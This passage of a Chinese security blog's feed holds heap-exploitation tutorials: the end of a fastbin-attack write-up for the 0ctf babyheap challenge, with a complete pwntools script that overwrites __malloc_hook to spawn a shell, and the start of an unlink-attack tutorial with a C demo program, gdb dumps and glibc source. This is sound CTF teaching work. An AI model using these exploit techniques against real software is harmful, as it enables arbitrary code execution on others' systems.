class="line">           errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             return NULL;</span><br><span class="line">           ...</span><br></pre></td></tr></table></figure></p><p>fastbin_index(0x7f)的返回值为5，因此我们只需要在fastbin chunk index为5的链表上面构建就行了，5所对应的fast bin chunk的大小为0x70.</p><p>那么这个假chunk的地址就是0x7ffff7fc2b08 + 5 - 8 = 0x7ffff7fc2b05</p><p>通过连续malloc(0x60)两次，然后释放第二个malloc的chunk，得到下面的内存布局<br><img src="/images/heap_exp/2021-05-28-16-00-59.png" alt></p><p>我们通过溢出ck0，覆盖ck1的fd指针，</p><p>0x7ffff7fc2af5 - 8 =  0x7ffff7fc2aed<br>0x7ffff7fc2af5: 0x000000000000007f<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555757180, size=0x70, flags=)  ←  Chunk(addr=0x7ffff7fc2afd, </span><br><span class="line">size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0xfff7c83e20000010]</span><br></pre></td></tr></table></figure></p><p>现在我们把假的chunk添加到了fast bin上了，并且我们把size修正好了，使他能够绕过检测。<br>我们现在连续malloc(0x60)两次就可以得到一个指向 0x7ffff7fc2aed+16 = 0x7ffff7fc2afd的指针，通过0x7ffff7fc2afd覆盖0x7ffff7fc2b10(__malloc_hook).</p><p>我们覆盖的值可以为system函数的地址，通过main_arena泄露的地址，先确定system函数地址为<code>0x7ffff7c43390</code></p><p>观察内存值可以发现, 我们已经成功修改了_malloc_hook的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx &amp;__malloc_hook</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x00007ffff7c43390</span><br></pre></td></tr></table></figure></p><p>我们再确定/bin/sh字符串的地址，进而在调用malloc的时候，直接将这个参数传进去就行了<br>确定/bin/sh的地址为<code>0x7ffff7d8ad57</code><br>但是后来发现这个二进制对长度是有限制的，只截取8个字符，所以我们不能用这种办法。</p><p>那就只能在二进制中直接找execve(‘/bin/sh’)的地方了，然后把这个地址写到我们的__malloc_hook中就行了</p><p>我的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./babyheap_long&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;babyheap_long&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">recv_str = target.recv()</span><br><span class="line">print recv_str</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def allocate(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recv()</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x70)</span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x30)</span><br><span class="line"></span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line"></span><br><span class="line">allocate(0x70)</span><br><span class="line"></span><br><span class="line">write_data(0,0x80,&apos;A&apos;*0x70 + p64(0x180) + p64(0x100))</span><br><span class="line"></span><br><span class="line">remove(2)</span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line"></span><br><span class="line">u = make_unpacker(64, endian=&apos;little&apos;, sign=&apos;unsigned&apos;)</span><br><span class="line">res = view(0)</span><br><span class="line">leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">print(hex(u(leak_address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  </span><br><span class="line"></span><br><span class="line">remove(4)   ## make heap layout</span><br><span class="line"></span><br><span class="line">write_data(2,0x78,&apos;A&apos;*0x68 + p64(0x70) + p64(0x7ffff7fc2aed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  ## get the ptr to control malloc_hook</span><br><span class="line"></span><br><span class="line">system_addr = 0x7ffff7c43390</span><br><span class="line">write_data(5,19 + 8,&apos;A&apos;*19 + p64(system_addr))</span><br><span class="line"></span><br><span class="line">allocate(0x7ffff7d8ad57) # trigger system</span><br></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a> </li><li><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li><li><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a></li><li><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/66476135</a></li></ol><h2 id="我的原图"><a href="#我的原图" class="headerlink" title="我的原图"></a>我的原图</h2><p><img src="/images/heap_exp/2021-05-28-17-30-46.png" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Fastbin-attack&quot;&gt;&lt;a href=&quot;#Fastbin-attack&quot; class=&quot;headerlink&quot; title=&quot;Fastbin attack&quot;&gt;&lt;/a&gt;Fastbin attack&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列三：Unlink</title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/</id>
    <published>2021-06-17T13:01:06.000Z</published>
    <updated>2021-06-17T13:27:11.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unlink实例"><a href="#unlink实例" class="headerlink" title="unlink实例"></a>unlink实例</h2><p>通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">uint64_t *target;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    puts(&quot;So let&apos;s explain what a heap Unlink attack is.&quot;);</span><br><span class="line">    puts(&quot;This will give us a write, however there are several restrictions on what we write and where.&quot;);</span><br><span class="line">    puts(&quot;Also this attack is only really feasible on pre-tcache libc versions (before 2.26).\n&quot;);</span><br><span class="line"></span><br><span class="line">    puts(&quot;For this attack to work, we need to know the address of a pointer to a heap pointer&quot;);</span><br><span class="line">    puts(&quot;Think of something like a global variable (like in the bss) array which stores heap pointers.&quot;);</span><br><span class="line">    puts(&quot;This attack will write a pointer to a little bit before the array (or the entry of the array that points to the heap chunk) to itself.&quot;);</span><br><span class="line">    puts(&quot;This can be pretty useful for a variety of reasons, especially if we write the pointer to an array of pointers that we can edit. Then we can leverage the pointer from the unlink to overwrite pointers in the array.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off the attack by allocating two chunks, and storing the first chunk in the global variable pointer target\n&quot;);</span><br><span class="line">    printf(&quot;The goal of this will be to overwrite the pointer to target with an address right before it.\n\n&quot;);</span><br><span class="line">    uint64_t *ptr0, *ptr1, *temp;</span><br><span class="line"></span><br><span class="line">    ptr0 = (uint64_t *)malloc(0xa0);</span><br><span class="line">    ptr1 = (uint64_t *)malloc(0xa0);</span><br><span class="line"></span><br><span class="line">    target = ptr0;      </span><br><span class="line"></span><br><span class="line">    printf(&quot;The two chunk addresses are %p and %p\n&quot;, ptr0, ptr1);   //---------------&gt; b1 </span><br><span class="line">    printf(&quot;Target pointer stores the first chunk %p at %p\n\n&quot;, target, &amp;target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So what an unlink does, is it takes a chunk out of a doubly linked list (which certain freed chunks in the heap are stored in).\n&quot;);</span><br><span class="line">    printf(&quot;It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.\n&quot;);</span><br><span class="line">    printf(&quot;That is where we get our pointer write from. However in order to set this up, we will need to make a fake chunk that will pass three checks.\n&quot;);</span><br><span class="line">    printf(&quot;So let&apos;s start setting up the fake chunk. \n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have pointers back to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;This is why we need the heap chunk our fake chunk is stored in to be stored in a pointer somewhere that we know the address of.\n&quot;);</span><br><span class="line">    printf(&quot;So the previous chunks forward pointer (these chunks are stored in a doubly linked list), and the next chunks back pointer both have to point to this chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The forward pointer of this type of heap chunk is at offset 0x10, and the back pointer is at offset 0x18.\n&quot;);</span><br><span class="line">    printf(&quot;As a result for the previous pointer we can just subtract 0x10 from the address of the target, and for the forward pointer we will just subtract 0x18 from the address of target.\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[2] = (uint64_t)(&amp;target - 0x3);    // Fake Chunk P-&gt;fd pointer</span><br><span class="line">    target[3] = (uint64_t)(&amp;target - 0x2);    // Fake Chunk  P-&gt;bk pointer</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fd pointer: %p\n&quot;, (void *)ptr0[2]);  //---------------------------&gt; b2</span><br><span class="line">    printf(&quot;Bk  pointer: %p\n\n&quot;, (void *)ptr0[3]);</span><br><span class="line"></span><br><span class="line">    temp = (uint64_t *)ptr0[2];</span><br><span class="line">    printf(&quot;Fake chunk starts at \t%p\n&quot;, (void *)ptr0);</span><br><span class="line">    printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]);</span><br><span class="line">    temp = (uint64_t *)ptr0[3];</span><br><span class="line">    printf(&quot;Bk-&gt;Fd:    \t\t%p\n\n&quot;, (void *)temp[2]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we will pass that check. Next we have to worry about the size check.\n&quot;);</span><br><span class="line">    printf(&quot;How we will trigger a heap unlink is we will edit the heap metadata of the second chunk, so that it will say that the previous chunk has been freed and it points to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free the second chunk, it will cause our fake chunk to be unlinked and execute the pointer write.\n&quot;);</span><br><span class="line">    printf(&quot;However it will check that the size of our chunk is equal to the previous size of the chunk being freed, so we have to make sure that they are equal.\n&quot;);</span><br><span class="line">    printf(&quot;The previous size of the second chunk should be shrunk down so it thinks the heap metadata starts with our fake chunk. This typically means shrinking it by 0x10.\n&quot;);</span><br><span class="line">    printf(&quot;In addition to that, we have to clear the previous in use bit from the size value of the second chunk, so it thinks that the previous chunk has been freed(this can be done with something like a heap overflow).\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[0] = 0x0;    // Fake Chunk  Previous Size</span><br><span class="line">    target[1] = 0xa0;    // Fake Chunk  Size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr1[-2] = 0xa0;    // Second Chunk previous size  </span><br><span class="line">    ptr1[-1] = 0xb0;    // Secon Chunk size (can be done with a bug like a heap overflow)</span><br><span class="line"></span><br><span class="line">    printf(&quot;The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.\n&quot;);</span><br><span class="line">    printf(&quot;We will set it equal to 0x0 to avoid those unneeded checks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[4] = 0x0;    // fd_nextsize</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we have our fake chunk setup. Checkout the other writeups in this module for more details on the particular data structure of this heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fake Chunk Previous Size:\t0x%x\n&quot;, (int)ptr0[0]);</span><br><span class="line">    printf(&quot;Fake Chunk Size:\t\t0x%x\n&quot;, (int)ptr0[1]);</span><br><span class="line">    printf(&quot;Fake Chunk Fd pointer:\t\t0x%x\n&quot;, (int)ptr0[2]);</span><br><span class="line">    printf(&quot;Fake Chunk Bk pointer:\t\t0x%x\n&quot;, (int)ptr0[3]);</span><br><span class="line">    printf(&quot;Fake Chunk fd_nextsize:\t\t0x%x\n\n&quot;, (int)ptr0[4]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can free the second chunk and trigger the unlink.\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1); // ----------------------------------&gt; b3</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that target should be the address of the Fd pointer: %p\n&quot;, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/heap_exp/2021-05-23-15-18-54.png" alt><br>红色箭头为在free(ptr1)之后target的指向</p><p>在b1处打断点，观察target的地址和储存值<br><img src="/images/heap_exp/2021-05-22-15-32-49.png" alt><br>target所在地址为bss全局变量区上的，存储的是ptr0指向的chunk1的地址0x5578420,与我们通过heap chunks观察到的地址相同。</p><p>在b2处打断点，观察内存情况<br><img src="/images/heap_exp/2021-05-22-15-47-54.png" alt></p><p>我们可以看到在target指向的heap chunk1-&gt;data中的偏移16个字节和偏移24个字节的地方被赋值，内容为bss段上&amp;target地址减去24和减去16。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  (long *)&amp;target -3</span><br><span class="line">0x555555756000              // &amp;target -3的地址</span><br><span class="line">gef➤  (long *)&amp;target -2</span><br><span class="line">0x555555756008              // &amp;target -2的地址</span><br></pre></td></tr></table></figure></p><p>在b3处打断点观察free之前的内存情况<br>这个是Chunk1的内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10gx 0x555555758420 - 16</span><br><span class="line">0x555555758410: 0x0000000000000000      0x00000000000000b1    // prev size | current size</span><br><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target-3| &amp;target-2</span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>下面是chunk2的内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10gx 0x5555557584d0 - 16</span><br><span class="line">0x5555557584c0: 0x00000000000000a0      0x00000000000000b0     // current的prev_inuse标志位被置0</span><br><span class="line">0x5555557584d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758500: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>free(ptr1)的操作会带来的影响，由于chunk2的prev_inuse标志位被置0，free函数会调用进行后向融合，free的源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* consolidate backward */</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = p-&gt;prev_size;                       // prev_size 为0xa0</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((long) prevsize));   // 这个指向的是0x5555557584c0 - 0xa0 = 0x555555758420 就是target[0]的内存地址</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以unlink的参数p就是target[0]的地址0x555555758420<br>为了知道unlink函数到底是如何操作了内存，我们继续看一下unlink的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="line">    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">      malloc_printerr (check_action,      \</span><br><span class="line">       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">       P, AV);      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                else &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; else &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>AV指向的是代表堆的数据结构malloc_state，P就是我们的target[0]地址，我们是在这个地方创建了一个假的chunk实际上。<br>进来之后首先会进行一个检查，<code>FD-&gt;bk != P || BK-&gt;fd != P</code> 看看FD的bk指针是不是指向的就是P，BK的fd指针是否指向P，为什么要有这个检查？<br>做这个检查主要是为了防止老版本的unlink导致的漏洞，正常的空闲链表是这样的<br><img src="/images/heap_exp/2021-05-22-16-30-24.png" alt><br>老版本的漏洞是，如果a2的fd和bk的值都已经被恶意修改了，比如利用一个堆溢出的漏洞修改了fd和bk，那么利用unlink就可以进行<br><code>a2-&gt;bk-&gt;fd = a2-&gt;fd</code>,由于a2-&gt;bk和a2-&gt;fd都可以被攻击者控制，那么攻击者就可以实现在任何一个内存地址上写任何一个自己想要的值，配合修改got表中的内容就可以实现任意代码执行的效果。</p><p>通过添加这个检查可以避免这种漏洞, 在unlink之前先检查a2-&gt;bk-&gt;fd是不是就是指向的a2, 就可以避免这种漏洞。</p><p>但是这种检查还是可以被绕过的，比如我们的这个例子就是通过创造一个虚假的chunk实现绕过这个unlink的检查。<br>现在a2就是target[0]的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target - 3  | &amp;target - 2 </span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>FD的值为0x0000555555756000<br>BK的值为0x0000555555756008<br>FD-&gt;bk值为0x0000555555756000的内存偏移24的位置存储的值,我们知道0x0000555555756000这个值是&amp;target - 0x3， 它偏移24就是target的地址&amp;target，他存储的值就是target, 而BK-&gt;fd为0x0000555555756008偏移16的位置存储的值，我们知道0x0000555555756008这个值是&amp;target - 0x3，它偏移16也是&amp;target，那么它存储的值也是target，而P就是target，所以就绕过了这个<code>FD-&gt;bk != P || BK-&gt;fd != P</code>的检查。<br>而<code>FD-&gt;bk = BK</code>这个操作就是让存储target的内存设置为0x0000555555756008<br>而<code>BK-&gt;fd = FD;</code>这个操作是让存储target的内存设置为0x0000555555756000  （ (uint64_t)(&amp;target - 0x3); ）<br>所以我们检查一下target的值最后是不是<code>0x0000555555756000</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/g &amp;target</span><br><span class="line">0x555555756018 &lt;target&gt;:        0x0000555555756000</span><br></pre></td></tr></table></figure></p><p>我们可以看到结果如我们的预测。<br>这个到底有什么用呢？<br>假如我们现在有一个数组是这样的<br><img src="/images/heap_exp/2021-05-22-20-24-21.png" alt></p><p>当我们通过这种unlink的攻击，可以让target的值为array的开头，就是&amp;target -3，由于target本来是一个指向heap的指针，那么如果程序后面对heap的内存修改实际上是对这个数组的修改，如果这个内容可控的话，我们就可以修改会被调用的函数指针和是否通过认证的标志位，进而实现绕过认证或者任意代码执行的效果。或者是存在一个指针，这个指针在正常的业务中会被写入用户可控的内容，那么就构成了write what where的模式，可以实现往任意地方写任意内容的原型。</p><h2 id="Hitcon-2014-stkof"><a href="#Hitcon-2014-stkof" class="headerlink" title="Hitcon 2014 stkof"></a>Hitcon 2014 stkof</h2><p>我们使用Hitcon 2014一道赛题来看看这种unlink的实战。<br>题目文件的<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof" target="_blank" rel="noopener">下载链接</a>  </p><ul><li><p>目标：我们的目标是通过标准输入完成任意代码执行。</p></li><li><p>调试环境搭建：使用patchelf失败，显示的是segment fault，现在还不清楚为什么，由于这个文件是一个可执行文件而不是共享目标文件，貌似patchelf在给可执行文件做patch的时候是有点问题。看到有一篇博文<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/06/01/note/" target="_blank" rel="noopener">RCTF 2020 Pwn note</a> 介绍了不用patch直接通过修改环境变量以及直接运行ld文件，把二进制文件当做参数传给ld文件的方法是可以成功的。受次启发，使用gdb的时候直接调试ld文件，然后在gdb设置环境变量和参数，但是同样报segment fault。无奈只能求助于gdbserver attach，由于我们是可以在命令中直接运行的，最终终于搭建调试环境，至于为什么其他方法不行，我有机会再研究，也欢迎知道原理的同学交流一下。</p><ul><li><p>由于后面还要往标准输入写入特殊符号，所以还是要借助python实现调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br></pre></td></tr></table></figure><p>这些代码可以实现利用python起这个二进制文件，然后通过target.sendline发送任意的字符</p></li></ul></li><li><p>信息收集：看一下文件格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 